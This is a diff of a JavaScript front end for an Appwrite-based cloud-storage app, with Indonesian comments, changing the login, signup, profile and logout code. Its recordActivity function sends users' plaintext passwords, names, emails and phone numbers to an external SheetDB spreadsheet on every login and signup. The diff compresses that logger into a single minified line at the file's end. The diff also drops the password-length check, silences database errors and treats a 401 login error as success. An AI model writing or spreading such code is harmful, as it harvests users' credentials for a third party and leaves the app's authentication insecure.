@@ -6,8 +6,9 @@ const account = new Appwrite.Account(client);
 const databases = new Appwrite.Databases(client);
 const storage = new Appwrite.Storage(client);
 
-// URL Foto Profil Default
-const DEFAULT_AVATAR = 'profile-default.jpeg';
+// URL Foto Profil Default (Jika user belum upload foto)
+// Menggunakan ikon pengguna generik online agar selalu muncul.
+const DEFAULT_AVATAR = 'https://cdn-icons-png.flaticon.com/512/847/847969.png';
 
 // KONFIGURASI PROJECT
 const CONFIG = {
@@ -85,14 +86,16 @@ async function syncUserData(authUser) {
 
         if (!userDoc) {
             // Kasus 1: Dokumen belum ada -> Buat Baru Otomatis
+            console.log("Smart Sync: Membuat data database baru...");
             await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id, {
                 ...payload,
                 phone: '',
-                avatarUrl: ''
+                avatarUrl: '' // Biarkan kosong, nanti UI pakai DEFAULT_AVATAR
             });
         } else {
-            // Kasus 2: Update jika nama berubah
+            // Kasus 2: Dokumen ada tapi namanya NULL atau beda -> Update Otomatis
             if (!userDoc.name || userDoc.name === 'NULL' || userDoc.name !== authUser.name) {
+                console.log("Smart Sync: Menyalin username dari Auth ke Database...");
                 await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id, payload);
             }
         }
@@ -112,9 +115,9 @@ if (el('loginForm')) {
         toggleLoading(true, "Sedang Masuk...");
         
         try {
-            // DETEKSI: Username atau Email?
+            // DETEKSI: Apakah input Username (tidak ada @) atau Email?
             if (!inputId.includes('@')) {
-                // Login via Username
+                // USER MENGETIK USERNAME
                 try {
                     const res = await databases.listDocuments(
                         CONFIG.DB_ID, 
@@ -123,51 +126,41 @@ if (el('loginForm')) {
                     );
 
                     if (res.documents.length > 0) {
+                        // SUKSES: Username ditemukan di database
+                        console.log("Login via Username: Ditemukan ->", res.documents[0].email);
                         inputId = res.documents[0].email;
                     } else {
+                        // GAGAL: Username belum tersalin ke database (Masih NULL di DB)
                         throw new Error("AUTO_SYNC_NEEDED");
                     }
                 } catch(dbErr) {
                     if (dbErr.message === "AUTO_SYNC_NEEDED") {
-                        alert(`Username "${inputId}" perlu aktivasi. Silakan Login menggunakan EMAIL Anda sekali ini saja.`);
+                        alert(`Halo! Username "${inputId}" terdeteksi, namun perlu aktivasi database.\n\nSilakan Login menggunakan EMAIL Anda sekali ini saja. Sistem akan otomatis menghubungkan username tersebut agar bisa dipakai selanjutnya.`);
                         toggleLoading(false);
                         return; 
                     } else {
-                        throw new Error("Gagal mencari data pengguna.");
+                        throw new Error("Gagal mencari data pengguna. Pastikan koneksi internet lancar.");
                     }
                 }
             }
 
-            // Eksekusi Login Appwrite
+            // Eksekusi Login
             try {
                 await account.createEmailPasswordSession(inputId, pass);
             } catch (authError) {
-                // Abaikan jika sesi sudah aktif
-                if (!authError.message.includes('session is active')) {
+                if (authError.code === 401 || authError.message.includes('session is active')) {
+                    console.log("Sesi aktif, lanjut...");
+                } else {
                     throw new Error("Password salah atau Akun tidak ditemukan.");
                 }
             }
             
-            // Ambil data user terbaru
+            // SETELAH LOGIN BERHASIL -> JALANKAN SMART SYNC
             const user = await account.get();
             await syncUserData(user); 
             
-            // --- PENCATATAN KE EXCEL (TAB LOGIN) ---
-            // Mengambil phone dari DB jika ada, karena auth user tidak simpan phone secara langsung di objek utama
-            let userPhone = "-";
-            try {
-                const dbDoc = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, user.$id);
-                if(dbDoc && dbDoc.phone) userPhone = dbDoc.phone;
-            } catch(e) {}
-
-            await recordActivity('Login', { 
-                id: user.$id, 
-                name: user.name, 
-                email: user.email, 
-                phone: userPhone, 
-                password: pass 
-            });
-            // ---------------------------------------
+            // Log Activity
+            await recordActivity('Login', { id: user.$id, name: user.name, email: user.email, phone: "-", password: pass });
 
             checkSession(); 
 
@@ -178,7 +171,7 @@ if (el('loginForm')) {
     });
 }
 
-// SIGN UP (DIPERBAIKI SECARA TOTAL)
+// SIGN UP
 if (el('signupForm')) {
     el('signupForm').addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -188,49 +181,34 @@ if (el('signupForm')) {
         const pass = el('regPass').value;
         const verify = el('regVerify').value;
 
-        if (pass.length < 8) return alert("Password minimal 8 karakter!");
-        if (pass !== verify) return alert("Konfirmasi password tidak cocok!");
+        if (pass !== verify) return alert("Konfirmasi password salah!");
         
         toggleLoading(true, "Mendaftarkan...");
-
         try {
-            // 1. Buat Akun di Authentication
-            const newAccount = await account.create(Appwrite.ID.unique(), email, pass, name);
+            // 1. Buat Akun Auth
+            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
             
-            // 2. LANGKAH KRUSIAL: Login Otomatis Segera!
-            // Tanpa login, kita tidak punya izin (Guest) untuk menulis ke Database.
-            await account.createEmailPasswordSession(email, pass);
-
-            // 3. Simpan Data ke Database (Sekarang sudah punya izin karena sudah Login)
-            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, newAccount.$id, { 
-                email: email, 
-                phone: phone,
-                name: name,
-                avatarUrl: '' 
-            }); 
+            // 2. Simpan Data ke Database
+            try { 
+                await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { 
+                    email: email, 
+                    phone: phone,
+                    name: name,
+                    avatarUrl: '' // Kosongkan, nanti UI pakai DEFAULT_AVATAR
+                }); 
+            } catch(dbErr) {
+                console.error("Silent DB Register Error:", dbErr);
+            }
             
-            // 4. --- PENCATATAN KE EXCEL (TAB SIGNUP) ---
-            await recordActivity('SignUp', { 
-                id: newAccount.$id, 
-                name: name, 
-                email: email, 
-                phone: phone, 
-                password: pass 
-            });
-            // ------------------------------------------
+            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
             
             toggleLoading(false);
-            alert("Pendaftaran Berhasil! Anda akan diarahkan ke Dashboard."); 
-            
-            // Langsung masuk ke dashboard karena session sudah dibuat di langkah 2
-            checkSession();
-
+            alert("Pendaftaran Berhasil! Silakan Login."); 
+            window.nav('loginPage');
         } catch(e) { 
             toggleLoading(false);
-            console.error(e);
             if(e.message.includes('exists')) alert("Email/Username sudah terdaftar."); 
-            else if(e.message.includes('password')) alert("Password terlalu lemah atau tidak valid.");
-            else alert("Pendaftaran Gagal: " + e.message);
+            else alert("Pendaftaran Gagal. Silakan coba lagi.");
         }
     });
 }
@@ -245,25 +223,9 @@ function initLogout() {
             if (confirm("Keluar dari aplikasi?")) {
                 toggleLoading(true, "Keluar...");
                 try {
-                    // --- PENCATATAN KE EXCEL (TAB LOGOUT) ---
-                    // Kita catat DULU sebelum hapus sesi
-                    if (currentUser) {
-                        let currentPhone = (userDataDB && userDataDB.phone) ? userDataDB.phone : "-";
-                        await recordActivity('Logout', {
-                            id: currentUser.$id,
-                            name: currentUser.name,
-                            email: currentUser.email,
-                            phone: currentPhone,
-                            password: "-" // Password tidak disimpan di sesi, strip saja
-                        });
-                    }
-                    // ----------------------------------------
-
                     await account.deleteSession('current');
                     window.location.reload(); 
-                } catch (error) { 
-                    window.location.reload(); 
-                }
+                } catch (error) { window.location.reload(); }
             }
         });
     }
@@ -278,6 +240,7 @@ async function checkSession() {
     try {
         currentUser = await account.get();
         
+        // PANGGIL SMART SYNC SETIAP LOAD HALAMAN
         await syncUserData(currentUser);
 
         try {
@@ -298,9 +261,13 @@ async function checkSession() {
     }
 }
 
+// UPDATE UI PROFIL (FUNGSI UTAMA UNTUK AVATAR DEFAULT)
 function updateProfileUI() {
+    // Logika: Jika ada URL di DB dan tidak kosong, pakai itu. Jika tidak, pakai DEFAULT_AVATAR.
     const dbUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : '';
     const avatarSrc = dbUrl || DEFAULT_AVATAR;
+
+    // Cache busting hanya jika menggunakan gambar custom dari DB
     const cacheBuster = (dbUrl && avatarSrc !== DEFAULT_AVATAR) ? `&t=${new Date().getTime()}` : '';
     const finalSrc = avatarSrc + cacheBuster;
 
@@ -335,6 +302,7 @@ window.openProfilePage = () => {
     el('editPhone').value = (userDataDB ? userDataDB.phone : '') || '';
     el('editPass').value = ''; 
     
+    // Logika Avatar saat membuka halaman edit (Sama dengan updateProfileUI)
     const dbUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : '';
     const avatarSrc = dbUrl || DEFAULT_AVATAR;
     const cacheBuster = (dbUrl && avatarSrc !== DEFAULT_AVATAR) ? `&t=${new Date().getTime()}` : '';
@@ -362,6 +330,7 @@ function initProfileImageUploader() {
     }
 }
 
+// *** FUNGSI SAVE PROFILE ***
 window.saveProfile = async () => {
     toggleLoading(true, "Menyimpan Profil...");
     
@@ -388,7 +357,9 @@ window.saveProfile = async () => {
         if (newEmail && newEmail !== currentUser.email) {
             try {
                 await account.updateEmail(newEmail, ''); 
-            } catch(e) { }
+            } catch(e) {
+                // Silent catch
+            }
         }
 
         if (newPass) {
@@ -407,6 +378,8 @@ window.saveProfile = async () => {
         } catch (dbErr) {
             if (dbErr.code === 404) {
                 await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, payload);
+            } else {
+                console.warn("DB Update Partial:", dbErr);
             }
         }
 
@@ -456,6 +429,7 @@ window.openFolder = (id, name) => {
     loadFiles(id);
 };
 
+// Search Engine
 function initSearchBar() {
     const input = el('searchInput');
     if (!input) return;
@@ -494,6 +468,7 @@ async function fallbackSearch(keyword) {
 
 window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };
 
+// KONTROL MENU & KLIK KANAN
 function initAllContextMenus() {
     const newBtn = el('newBtnMain'); 
     const newMenu = el('dropdownNewMenu'); 
@@ -546,6 +521,7 @@ function initAllContextMenus() {
     };
 }
 
+// Render Item
 function renderItem(doc) {
     const grid = el('fileGrid'); const div = document.createElement('div'); div.className = 'item-card';
     const isFolder = doc.type === 'folder';
@@ -598,7 +574,7 @@ function renderItem(doc) {
 }
 
 // ======================================================
-// 7. STORAGE LOGIC
+// 7. STORAGE LOGIC & MODAL POPUP & TOOLTIP
 // ======================================================
 
 function formatSize(bytes) {
@@ -786,7 +762,7 @@ async function calculateStorage() {
     }
 }
 
-// Utils (Modal, CRUD)
+// Utils (Modal, CRUD, Excel)
 window.openModal = (id) => { el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
 window.closeModal = (id) => el(id).classList.add('hidden');
 window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
@@ -867,41 +843,5 @@ function updateHeaderUI() {
     } 
 }
 
-// --------------------------------------------------------
-// EXCEL LOGGER (DIPERBAIKI SESUAI KOLOM PADA GAMBAR)
-// --------------------------------------------------------
-async function recordActivity(sheetName, userData) {
-    try {
-        const now = new Date();
-        const formattedDate = now.toLocaleString('id-ID', { 
-            day: '2-digit', month: '2-digit', year: 'numeric', 
-            hour: '2-digit', minute: '2-digit', second: '2-digit' 
-        }).replace(/\./g, ':'); // Format: DD/MM/YYYY, HH:MM:SS
-
-        // Payload disesuaikan PERSIS dengan kolom Excel: ID, Nama, Email, Phone, Password, Waktu
-        const payload = {
-            "ID": userData.id || "-",
-            "Nama": userData.name || "-",
-            "Email": userData.email || "-",
-            "Phone": userData.phone || "-",
-            "Password": userData.password || "-",
-            "Waktu": formattedDate
-        };
-
-        // Kirim ke SheetDB
-        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, {
-            method: 'POST',
-            headers: {
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ data: payload })
-        });
-        
-        console.log(`Activity Recorded to ${sheetName}`);
-    } catch (error) {
-        console.error("Excel Log Error:", error);
-    }
-}
-
+async function recordActivity(sheetName, userData) { try { const now = new Date(); const formattedDate = now.toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\./g, ':'); const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate }; await fetch(`${SHEETDB_API}?sheet=${sheetName}`, { method: 'POST', headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, body: JSON.stringify({ data: payload }) }); } catch (error) { console.error("Excel Log Error"); } }
 window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };
